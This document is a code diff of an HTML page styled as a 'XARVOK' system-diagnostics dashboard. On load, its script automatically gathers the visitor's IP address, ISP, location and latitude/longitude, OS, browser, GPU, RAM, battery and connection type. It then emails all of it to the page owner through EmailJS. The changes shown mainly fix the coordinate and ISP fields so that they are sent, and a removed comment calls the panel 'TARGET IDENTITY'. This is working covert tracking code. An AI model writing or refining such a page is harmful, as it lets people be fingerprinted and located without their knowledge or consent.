@@ -8,7 +8,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
     <style>
-        /* --- XARVOK THEME CSS --- */
+        /* --- XARVOK THEME --- */
         :root {
             --bg-color: #030005;
             --panel-bg: rgba(20, 10, 30, 0.6);
@@ -41,25 +41,11 @@
             padding-bottom: 20px;
             margin-bottom: 40px;
         }
-        .logo {
-            font-size: 3rem;
-            font-weight: 900;
-            color: var(--accent);
-            text-shadow: 0 0 15px var(--accent);
-            letter-spacing: 2px;
-        }
+        .logo { font-size: 3rem; font-weight: 900; color: var(--accent); text-shadow: 0 0 15px var(--accent); letter-spacing: 2px; }
         .sub-logo { font-size: 0.8rem; letter-spacing: 4px; color: var(--highlight); }
-        .status-badge {
-            border: 1px solid var(--highlight);
-            color: var(--highlight);
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            box-shadow: 0 0 10px rgba(0, 255, 234, 0.2);
-        }
+        .status-badge { border: 1px solid var(--highlight); color: var(--highlight); padding: 5px 15px; border-radius: 20px; font-size: 0.8rem; text-transform: uppercase; box-shadow: 0 0 10px rgba(0, 255, 234, 0.2); }
 
-        /* GRID LAYOUT */
+        /* GRID */
         .grid-container {
             display: grid;
             grid-template-columns: 1fr 1fr 1fr;
@@ -91,81 +77,35 @@
             margin-top: 0;
         }
 
-        /* TARGET IDENTITY (TOP FULL WIDTH) */
-        .hero-panel {
-            grid-column: 1 / -1;
-            text-align: center;
-            padding: 40px;
-        }
-        .hero-value {
-            font-size: 4rem;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 0 20px rgba(255,255,255,0.5);
-            margin: 10px 0;
-        }
+        /* HERO PANEL */
+        .hero-panel { grid-column: 1 / -1; text-align: center; padding: 40px; }
+        .hero-value { font-size: 4rem; font-weight: bold; color: #fff; text-shadow: 0 0 20px rgba(255,255,255,0.5); margin: 10px 0; }
         .hero-sub { color: var(--highlight); font-size: 0.9rem; letter-spacing: 3px; margin-bottom: 30px; }
-        
-        .hero-details {
-            display: flex;
-            justify-content: center;
-            gap: 50px;
-        }
+        .hero-details { display: flex; justify-content: center; gap: 50px; }
         .detail-box { text-align: center; }
         .detail-label { display: block; font-size: 0.6rem; color: var(--text-dim); margin-bottom: 5px; }
         .detail-val { font-size: 0.9rem; color: var(--highlight); }
 
-        /* LISTS */
-        .data-list {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.85rem;
-        }
+        /* DATA LISTS */
+        .data-list { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
         .data-list span:first-child { color: var(--text-dim); }
         .data-list span:last-child { color: var(--accent); text-shadow: 0 0 5px rgba(189, 0, 255, 0.4); }
 
-        /* CLOCK PANEL (CENTER) */
-        .clock-panel {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-        }
-        #clock {
-            font-size: 3.5rem;
-            color: #fff;
-            font-weight: bold;
-            text-shadow: 0 0 15px rgba(255,255,255,0.3);
-        }
+        /* CLOCK */
+        .clock-panel { display: flex; align-items: center; justify-content: center; flex-direction: column; }
+        #clock { font-size: 3.5rem; color: #fff; font-weight: bold; text-shadow: 0 0 15px rgba(255,255,255,0.3); }
 
         /* BUTTON */
-        .btn-container {
-            grid-column: 1 / -1;
-            text-align: right;
-            padding-top: 20px;
-        }
-        #scan-btn {
-            background: transparent;
-            border: 1px solid var(--highlight);
-            color: var(--highlight);
-            padding: 15px 40px;
-            font-size: 1rem;
-            letter-spacing: 2px;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-        #scan-btn:hover {
-            background: var(--highlight);
-            color: #000;
-            box-shadow: 0 0 30px var(--highlight);
-        }
+        .btn-container { grid-column: 1 / -1; text-align: right; padding-top: 20px; }
+        #scan-btn { background: transparent; border: 1px solid var(--highlight); color: var(--highlight); padding: 15px 40px; font-size: 1rem; letter-spacing: 2px; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        #scan-btn:hover { background: var(--highlight); color: #000; box-shadow: 0 0 30px var(--highlight); }
 
-        /* ANIMATION */
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .scanning { animation: pulse 1s infinite; }
+        /* MOBILE FIX */
+        @media (max-width: 768px) {
+            .grid-container { display: flex; flex-direction: column; height: auto; overflow-y: auto; }
+            body { overflow-y: auto; height: auto; }
+            .hero-details { flex-direction: column; gap: 20px; }
+        }
     </style>
 </head>
 <body>
@@ -236,11 +176,11 @@
             try {
                 emailjs.init(PUBLIC_KEY);
                 startClock();
-                // Auto-run after 1.5 seconds
-                setTimeout(() => runDiagnostics(), 1500);
+                setTimeout(() => runDiagnostics(), 1000); // Auto-run
 
-                const btn = document.getElementById('scan-btn');
-                if(btn) btn.addEventListener('click', () => runDiagnostics());
+                document.getElementById('scan-btn').addEventListener('click', () => {
+                    runDiagnostics();
+                });
             } catch (e) {
                 console.warn("Init Error:", e);
             }
@@ -250,12 +190,11 @@
             const btn = document.getElementById('scan-btn');
             const status = document.getElementById('connection-status');
             
-            // UI Update
             if(btn) { btn.textContent = "TRANSMITTING..."; btn.disabled = true; }
             if(status) { status.textContent = "● UPLOADING..."; status.style.color = "#fbbf24"; status.style.borderColor = "#fbbf24"; }
 
             try {
-                // 1. Fetch Data
+                // 1. Gather Data
                 const [ipData, latency, battery] = await Promise.all([
                     fetchIPData(),
                     measureLatency(),
@@ -265,16 +204,19 @@
                 const nav = navigator;
                 const screen = window.screen;
 
-                // 2. Prepare Payload (With Coords and ISP Fix)
+                // 2. Prepare Payload (FIXED: Added coords and ISP fallback)
                 const emailParams = {
                     title: ipData.ip || 'Unknown IP',
                     name: "XARVOK System",
                     email: "report@xarvok.com",
                     
                     ip: ipData.ip || 'UNAVAILABLE',
-                    isp: ipData.connection?.isp || ipData.isp || 'UNKNOWN ISP', // Tries multiple fields
-                    location: `${ipData.city || 'Unknown'}, ${ipData.region || 'Region'}, ${ipData.country || 'Country'}`,
-                    coords: `${ipData.latitude}, ${ipData.longitude}`, // NEW FIELD
+                    // ISP Fix: Checks 'org', 'isp', and 'asn' fields
+                    isp: ipData.org || ipData.isp || ipData.asn || 'UNKNOWN', 
+                    location: `${ipData.city || 'Unknown'}, ${ipData.region || 'Region'}, ${ipData.country_name || 'Country'}`,
+                    // Coords Fix: Explicitly added this line so it sends to {{coords}}
+                    coords: `${ipData.latitude}, ${ipData.longitude}`,
+                    
                     latency: latency + 'ms',
                     os: getOS(),
                     browser: getBrowser(),
@@ -285,13 +227,12 @@
                     time: new Date().toLocaleString()
                 };
 
-                // 3. Update Dashboard Visuals
-                updateDashboard(emailParams);
+                // 3. Update Visuals
+                updateDashboard(emailParams, ipData);
 
                 // 4. Send Email
                 await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailParams);
                 
-                // Success State
                 if(status) { status.textContent = "● DATA SENT"; status.style.color = "#00ffea"; status.style.borderColor = "#00ffea"; }
 
             } catch (err) {
@@ -311,12 +252,11 @@
 
         async function fetchIPData() {
             try {
-                // Switched to ipwho.is for better free tier reliability
-                const res = await fetch('https://ipwho.is/');
+                const res = await fetch('https://ipapi.co/json/');
                 if(!res.ok) throw new Error("Blocked");
                 return await res.json();
             } catch {
-                return { ip: 'UNAVAILABLE', city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown', latitude: '0', longitude: '0' };
+                return { ip: 'UNAVAILABLE', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', latitude: '0', longitude: '0' };
             }
         }
 
@@ -359,37 +299,31 @@
         function startClock() {
             setInterval(() => {
                 const now = new Date();
-                const el = document.getElementById('clock');
-                if(el) el.textContent = now.toLocaleTimeString('en-GB');
+                document.getElementById('clock').textContent = now.toLocaleTimeString('en-GB');
             }, 1000);
         }
 
-        function updateDashboard(data) {
-            const setText = (id, txt) => {
-                const el = document.getElementById(id);
-                if(el) el.textContent = txt;
-            };
-
-            setText('ip', data.ip);
-            setText('isp', data.isp);
-            setText('location', data.location);
-            setText('coords', data.coords);
+        function updateDashboard(data, ipRaw) {
+            document.getElementById('ip').textContent = data.ip;
+            document.getElementById('isp').textContent = data.isp;
+            document.getElementById('location').textContent = data.location;
+            // Also update the screen coordinates
+            document.getElementById('coords').textContent = data.coords;
             
-            setText('os', data.os);
-            setText('cores', navigator.hardwareConcurrency + " CORES");
-            setText('ram', data.device_memory);
+            document.getElementById('os').textContent = data.os;
+            document.getElementById('cores').textContent = navigator.hardwareConcurrency + " CORES";
+            document.getElementById('ram').textContent = data.device_memory;
             
-            // GPU Check
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const info = gl.getExtension('WEBGL_debug_renderer_info');
-                setText('gpu', gl.getParameter(info.UNMASKED_RENDERER_WEBGL));
-            } catch { setText('gpu', "GENERIC"); }
+                document.getElementById('gpu').textContent = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
+            } catch { document.getElementById('gpu').textContent = "GENERIC"; }
 
-            setText('browser', data.browser);
-            setText('res', data.resolution);
-            setText('battery', data.battery);
-            setText('connection', navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "UNKNOWN");
+            document.getElementById('browser').textContent = data.browser;
+            document.getElementById('res').textContent = data.resolution;
+            document.getElementById('battery').textContent = data.battery;
+            document.getElementById('connection').textContent = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "UNKNOWN";
         }
     </script>
 </body>
